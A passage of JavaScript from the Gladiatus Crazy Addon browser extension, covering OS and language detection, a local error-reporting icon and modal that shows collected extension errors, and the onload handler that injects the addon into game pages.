        const userAgent = navigator.userAgent;
        let OSName = "Unknown";
        
        if (userAgent.indexOf("Win") > -1) OSName = "Windows";
        else if (userAgent.indexOf("Mac") > -1) OSName = "Macintosh";
        else if (userAgent.indexOf("Linux") > -1) OSName = "Linux";
        else if (userAgent.indexOf("Android") > -1) OSName = "Android";
        else if (userAgent.indexOf("like Mac") > -1) OSName = "iOS";
        
        return OSName;
    }

    function getLanguage() {
        return navigator.language || navigator.userLanguage;
    }

	window.addEventListener('error', (msg, url, linenumber) => {
		if (!event || !event.filename || !event.filename.includes('extension://')) return;
		let filename_match = event.filename.match(/\/core\/source\/([a-zA-Z0-9_\-\.\/]+)/i);
		if (!filename_match) return;

		// Gather error info
		error_list.push({
			filename: filename_match[1],
			lineno: event.lineno,
			message: event.message,
			stack: event?.error?.stack || ''
		});

		// Already initialised
		if (error_list.length > 1) return;

		// Create error icon
		let wrapper = document.createElement('div');
		wrapper.className = 'notification-error';
		wrapper.style.position = 'fixed';
		wrapper.style.bottom = '5px';
		wrapper.style.left = '5px';
		wrapper.style.background = 'none';
		wrapper.style.border = 'none';
		let icon = document.createElement('div');
		icon.className = 'icon';
		icon.title = 'GCA Error(s) detected.';
		icon.style.width = '16px';
		icon.style.height = '16px';
		icon.style.cursor = 'pointer';
		wrapper.appendChild(icon);
		document.body.appendChild(wrapper);

		icon.addEventListener('click', () => {
			const browserInfo = getBrowserInfo();
			const OSInfo = getOSInfo();
			const language = getLanguage();

			let errors = error_list.map(info => {
				return `Error --------------\nBrowser: ${browserInfo.browserName} ${browserInfo.version}\nOS: ${OSInfo}\nLanguage: ${language}\n${info.filename}:${info.lineno}\n${info.message}\n${info.stack}`
			}).join('\n\n');

			// You never know... so if the UI modal fails, throw an alert
			try {
				let textarea = document.createElement('textarea');
				textarea.style.width = '100%';
				textarea.style.height = '140px';
				textarea.value = errors;

				let modal = new gca_tools.Modal(
					'Gladiatus Crazy Addon ' + error_list.length + ' error(s)',
					textarea,
					() => {modal.destroy();},
					() => {modal.destroy();}
				);
				modal.body_wrapper.style.height = '170px';
				modal.show();
			} catch(e) {
				alert(errors);
			};
		});
	});
})();

// Onload Handler
(function(){
	var loaded = false;
	var fireLoad = function() {
		if(loaded) return;
		loaded = true;
		gca_global.inject();
	};
	gca_global.preinject();
	if (document.readyState == 'interactive' || document.readyState == 'complete') {
		fireLoad();
	} else {
		window.addEventListener('DOMContentLoaded', fireLoad, true);
		window.addEventListener('load', fireLoad, true);
	}
})();

// ESlint defs
/* global gca, gca_audio, gca_build, gca_data, gca_data_recipes, gca_getPage, gca_links, gca_locale, gca_notifications, gca_options, gca_resources, gca_section, gca_tools */
/* global jQuery, Chart, expeditionProgressBar, dungeonProgressBar, arenaProgressBar, ctProgressBar */
